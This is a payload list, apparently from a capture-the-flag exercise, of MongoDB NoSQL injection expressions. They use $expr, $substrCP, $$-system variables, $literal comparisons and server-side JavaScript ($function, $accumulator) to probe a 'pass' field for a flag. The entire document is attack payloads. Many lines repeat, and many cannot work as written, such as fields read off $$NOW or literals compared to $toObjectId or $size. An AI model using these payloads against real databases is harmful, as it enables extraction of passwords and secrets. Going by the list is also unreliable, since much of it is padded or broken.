# Payload dictionary III — the exotic/deep payloads

## The `$$`-variables — the agg-side

```json
{"$expr": {"$eq": [{"$substrCP": ["$$ROOT.pass", 0, 4]}, "flag"]}}
{"$expr": {"$eq": [{"$substrCP": ["$$CURRENT.pass", 0, 4]}, "flag"]}}
{"$expr": {"$eq": [{"$substrCP": ["$$NOW.pass", 0, 4]}, "flag"]}}
{"$expr": {"$eq": [{"$substrCP": ["$$REMOVE.pass", 0, 4]}, "flag"]}}
{"$expr": {"$eq": [{"$substrCP": ["$$DESCEND.pass", 0, 4]}, "flag"]}}
{"$expr": {"$eq": [{"$substrCP": ["$$PRUNE.pass", 0, 4]}, "flag"]}}
{"$expr": {"$eq": [{"$substrCP": ["$$KEEP.pass", 0, 4]}, "flag"]}}
{"$expr": {"$eq": [{"$substrCP": ["$$SEARCH_META.pass", 0, 4]}, "flag"]}}
{"$expr": {"$eq": [{"$substrCP": ["$$SEARCH_META.pass", 0, 4]}, "flag"]}}
{"$expr": {"$eq": [{"$substrCP": ["$$CLUSTER_TIME.pass", 0, 4]}, "flag"]}}
{"$expr": {"$eq": [{"$substrCP": ["$$USER_ROLES.pass", 0, 4]}, "flag"]}}
{"$expr": {"$eq": [{"$substrCP": ["$$USER_ID.pass", 0, 4]}, "flag"]}}
{"$expr": {"$eq": [{"$substrCP": ["$$NOW.pass", 0, 4]}, "flag"]}}
{"$expr": {"$eq": [{"$substrCP": ["$$ROOT", 0, 4]}, "flag"]}}
{"$expr": {"$eq": [{"$substrCP": ["$$CURRENT", 0, 4]}, "flag"]}}
{"$expr": {"$eq": [{"$substrCP": ["$$NOW", 0, 4]}, "flag"]}}
{"$expr": {"$eq": [{"$substrCP": ["$$REMOVE", 0, 4]}, "flag"]}}
{"$expr": {"$eq": [{"$substrCP": ["$$DESCEND", 0, 4]}, "flag"]}}
{"$expr": {"$eq": [{"$substrCP": ["$$PRUNE", 0, 4]}, "flag"]}}
{"$expr": {"$eq": [{"$substrCP": ["$$KEEP", 0, 4]}, "flag"]}}
{"$expr": {"$eq": [{"$substrCP": ["$$SEARCH_META", 0, 4]}, "flag"]}}
{"$expr": {"$eq": [{"$substrCP": ["$$CLUSTER_TIME", 0, 4]}, "flag"]}}
{"$expr": {"$eq": [{"$substrCP": ["$$USER_ROLES", 0, 4]}, "flag"]}}
{"$expr": {"$eq": [{"$substrCP": ["$$USER_ID", 0, 4]}, "flag"]}}
{"$expr": {"$eq": [{"$substrCP": ["$$ROOT.pass", 0, {"$strLenCP": "$$ROOT.pass"}]}, "flag"]}}
{"$expr": {"$eq": [{"$substrCP": ["$$CURRENT.pass", 0, {"$strLenCP": "$$CURRENT.pass"}]}, "flag"]}}
{"$expr": {"$eq": [{"$substrCP": ["$$NOW.pass", 0, {"$strLenCP": "$$NOW.pass"}]}, "flag"]}}
{"$expr": {"$eq": [{"$substrCP": ["$$ROOT.pass", 0, {"$strLenCP": "$$ROOT.pass"}]}, "flag"]}}
{"$expr": {"$eq": [{"$substrCP": ["$$CURRENT.pass", 0, {"$strLenCP": "$$CURRENT.pass"}]}, "flag"]}}
{"$expr": {"$eq": [{"$substrCP": ["$$NOW.pass", 0, {"$strLenCP": "$$NOW.pass"}]}, "flag"]}}
```

The `$$`-variables — `operators-aggregation.md` — `$$ROOT`/`$$CURRENT`/
`$$NOW`/`$$REMOVE`/`$$DESCEND`/`$$PRUNE`/`$$KEEP`/`$$SEARCH_META`/
`$$CLUSTER_TIME`/`$$USER_ROLES`/`$$USER_ID`.

## The `$literal` — the constant-expression

```json
{"$expr": {"$eq": [{"$literal": "flag"}, "flag"]}}
{"$expr": {"$eq": [{"$literal": {"$x": 1}}, {"$x": 1}]}}
{"$expr": {"$eq": [{"$literal": ["flag"]}, ["flag"]]}}
{"$expr": {"$eq": [{"$literal": "a"}, {"$substrCP": ["$pass", 0, 1]}]}}
{"$expr": {"$eq": [{"$literal": "flag"}, {"$substrCP": ["$pass", 0, 4]}]}}
{"$expr": {"$eq": [{"$literal": "flag"}, {"$toString": "$pass"}]}}
{"$expr": {"$eq": [{"$literal": "flag"}, {"$toUpper": "$pass"}]}}
{"$expr": {"$eq": [{"$literal": "FLAG"}, {"$toUpper": "$pass"}]}}
{"$expr": {"$eq": [{"$literal": "flag"}, {"$toLower": "$pass"}]}}
{"$expr": {"$eq": [{"$literal": "flag"}, {"$strcasecmp": ["$pass", "flag"]}]}}
{"$expr": {"$eq": [{"$literal": "flag"}, {"$trim": {"input": "$pass"}}]}}
{"$expr": {"$eq": [{"$literal": "flag"}, {"$ltrim": {"input": "$pass"}}]}}
{"$expr": {"$eq": [{"$literal": "flag"}, {"$rtrim": {"input": "$pass"}}]}}
{"$expr": {"$eq": [{"$literal": "flag"}, {"$convert": {"input": "$pass", "to": "string"}}]}}
{"$expr": {"$eq": [{"$literal": "flag"}, {"$toObjectId": "$pass"}]}}
{"$expr": {"$eq": [{"$literal": "flag"}, {"$dateFromString": {"dateString": "$pass"}}]}}
{"$expr": {"$eq": [{"$literal": "flag"}, {"$dateToString": {"date": "$pass", "format": "%Y-%m-%d"}}]}}
{"$expr": {"$eq": [{"$literal": "flag"}, {"$let": {"vars": {"p": "$pass"}, "in": "$$p"}}]}}
{"$expr": {"$eq": [{"$literal": "flag"}, {"$map": {"input": "$pass", "as": "i", "in": "$$i"}}]}}
{"$expr": {"$eq": [{"$literal": "flag"}, {"$filter": {"input": "$pass", "as": "i", "cond": {"$gt": ["$$i", 0]}}}]}}
{"$expr": {"$eq": [{"$literal": "flag"}, {"$reduce": {"input": "$pass", "initialValue": 0, "in": {"$add": ["$$value", "$$this"]}}}]}}
{"$expr": {"$eq": [{"$literal": "flag"}, {"$cond": [{"$eq": ["$pass", "x"]}, "yes", "no"]}]}}
{"$expr": {"$eq": [{"$literal": "flag"}, {"$ifNull": ["$pass", "x"]}]}}
{"$expr": {"$eq": [{"$literal": "flag"}, {"$switch": {"branches": [{"case": {"$eq": ["$pass", "x"]}, "then": "y"}], "default": "z"}}]}}
{"$expr": {"$eq": [{"$literal": "flag"}, {"$function": {"body": "function(p) { return p; }", "args": ["$pass"], "lang": "js"}}]}}
{"$expr": {"$eq": [{"$literal": "flag"}, {"$accumulator": {"init": "function() { return 0; }", "accumulate": "function(s, p) { return s + p; }", "accumulateArgs": ["$pass"], "merge": "function(a, b) { return a + b; }", "lang": "js"}}]}}
{"$expr": {"$eq": [{"$literal": "flag"}, {"$indexOfCP": ["$pass", "{"]}]}}
{"$expr": {"$eq": [{"$literal": "flag"}, {"$indexOfBytes": ["$pass", "{"]}]}}
{"$expr": {"$eq": [{"$literal": "flag"}, {"$strLenCP": "$pass"}]}}
{"$expr": {"$eq": [{"$literal": "flag"}, {"$strLenBytes": "$pass"}]}}
{"$expr": {"$eq": [{"$literal": "flag"}, {"$toUpper": "$pass"}]}}
{"$expr": {"$eq": [{"$literal": "flag"}, {"$toLower": "$pass"}]}}
{"$expr": {"$eq": [{"$literal": "flag"}, {"$strcasecmp": ["$pass", "flag"]}]}}
{"$expr": {"$eq": [{"$literal": "flag"}, {"$regexMatch": {"input": "$pass", "regex": "^a"}}]}}
{"$expr": {"$eq": [{"$literal": "flag"}, {"$regexFind": {"input": "$pass", "regex": "^a"}}]}}
{"$expr": {"$eq": [{"$literal": "flag"}, {"$regexFindAll": {"input": "$pass", "regex": "[a-f]"}}]}}
{"$expr": {"$eq": [{"$literal": "flag"}, {"$split": ["$pass", "{"]}]}}
{"$expr": {"$eq": [{"$literal": "flag"}, {"$arrayElemAt": [{"$split": ["$pass", "{"]}, 0]}]}}
{"$expr": {"$eq": [{"$literal": "flag"}, {"$arrayElemAt": [{"$split": ["$pass", "{"]}, 1]}]}}
{"$expr": {"$eq": [{"$literal": "flag"}, {"$indexOfArray": [{"$split": ["$pass", "{"]}, "x"]}]}}
{"$expr": {"$eq": [{"$literal": "flag"}, {"$concatArrays": [{"$split": ["$pass", "{"]}, ["x"]]}]}}
{"$expr": {"$eq": [{"$literal": "flag"}, {"$setUnion": [{"$split": ["$pass", "{"]}, ["x"]]}]}}
{"$expr": {"$eq": [{"$literal": "flag"}, {"$setIntersection": [{"$split": ["$pass", "{"]}, ["x"]]}]}}
{"$expr": {"$eq": [{"$literal": "flag"}, {"$setDifference": [{"$split": ["$pass", "{"]}, ["x"]]}]}}
{"$expr": {"$eq": [{"$literal": "flag"}, {"$setEquals": [{"$split": ["$pass", "{"]}, ["x"]]}]}}
{"$expr": {"$eq": [{"$literal": "flag"}, {"$setIsSubset": [{"$split": ["$pass", "{"]}, ["x"]]}]}}
{"$expr": {"$eq": [{"$literal": "flag"}, {"$anyElementTrue": [{"$split": ["$pass", "{"]}]}]}}
{"$expr": {"$eq": [{"$literal": "flag"}, {"$allElementsTrue": [{"$split": ["$pass", "{"]}]}]}}
{"$expr": {"$eq": [{"$literal": "flag"}, {"$in": ["x", {"$split": ["$pass", "{"]}]}]}}
{"$expr": {"$eq": [{"$literal": "flag"}, {"$size": {"$split": ["$pass", "{"]}}]}}
{"$expr": {"$eq": [{"$literal": "flag"}, {"$slice": [{"$split": ["$pass", "{"]}, 0, 1]}]}}
{"$expr": {"$eq": [{"$literal": "flag"}, {"$range": [0, {"$strLenCP": "$pass"}, 1]}]}}
{"$expr": {"$eq": [{"$literal": "flag"}, {"$zip": {"inputs": [{"$split": ["$pass", "{"]}, ["x"]]}}]}}
{"$expr": {"$eq": [{"$literal": "flag"}, {"$reverseArray": {"$split": ["$pass", "{"]}}]}}
{"$expr": {"$eq": [{"$literal": "flag"}, {"$sortArray": {"input": {"$split": ["$pass", "{"]}, "sortBy": 1}}]}}
{"$expr": {"$eq": [{"$literal": "flag"}, {"$objectToArray": {"$split": ["$pass", "{"]}}]}}
{"$expr": {"$eq": [{"$literal": "flag"}, {"$arrayToObject": {"$split": ["$pass", "{"]}}]}}
{"$expr": {"$eq": [{"$literal": "flag"}, {"$mergeObjects": {"$split": ["$pass", "{"]}}]}}
{"$expr": {"$eq": [{"$literal": "flag"}, {"$getField": {"field": "flag", "input": {"$split": ["$pass", "{"]}}}]}}
{"$expr": {"$eq": [{"$literal": "flag"}, {"$unsetField": {"field": "pass", "input": {"$split": ["$pass", "{"]}}}]}}
{"$expr": {"$eq": [{"$literal": "flag"}, {"$setField": {"field": "flag", "input": {"$split": ["$pass", "{"]}, "value": "x"}}}]}}
{"$expr": {"$eq": [{"$literal": "flag"}, {"$map": {"input": {"$objectToArray": "$pass"}, "as": "i", "in": "$$i.v"}}]}}
{"$expr": {"$eq": [{"$literal": "flag"}, {"$filter": {"input": {"$objectToArray": "$pass"}, "as": "i", "cond": {"$eq": ["$$i.k", "flag"]}}}]}}
{"$expr": {"$eq": [{"$literal": "flag"}, {"$reduce": {"input": {"$objectToArray": "$pass"}, "initialValue": "", "in": {"$concat": ["$$value", "$$this.v"]}}}]}}
{"$expr": {"$eq": [{"$literal": "flag"}, {"$cond": [{"$eq": [{"$type": "$pass"}, "string"]}, "yes", "no"]}]}}
{"$expr": {"$eq": [{"$literal": "flag"}, {"$switch": {"branches": [{"case": {"$eq": [{"$type": "$pass"}, "string"]}, "then": "y"}], "default": "z"}}]}}
{"$expr": {"$eq": [{"$literal": "flag"}, {"$let": {"vars": {"p": {"$toString": "$pass"}}, "in": "$$p"}}]}}
{"$expr": {"$eq": [{"$literal": "flag"}, {"$map": {"input": {"$range": [0, {"$strLenCP": "$pass"}, 1]}, "as": "i", "in": {"$substrCP": ["$pass", "$$i", 1]}}}]}}
{"$expr": {"$eq": [{"$literal": "flag"}, {"$filter": {"input": {"$range": [0, {"$strLenCP": "$pass"}, 1]}, "as": "i", "cond": {"$eq": [{"$substrCP": ["$pass", "$$i", 1]}, "x"]}}}]}}
{"$expr": {"$eq": [{"$literal": "flag"}, {"$reduce": {"input": {"$range": [0, {"$strLenCP": "$pass"}, 1]}, "initialValue": "", "in": {"$concat": ["$$value", {"$substrCP": ["$pass", "$$this", 1]}]}}}]}}
```

`$literal` — `operators-aggregation.md`.
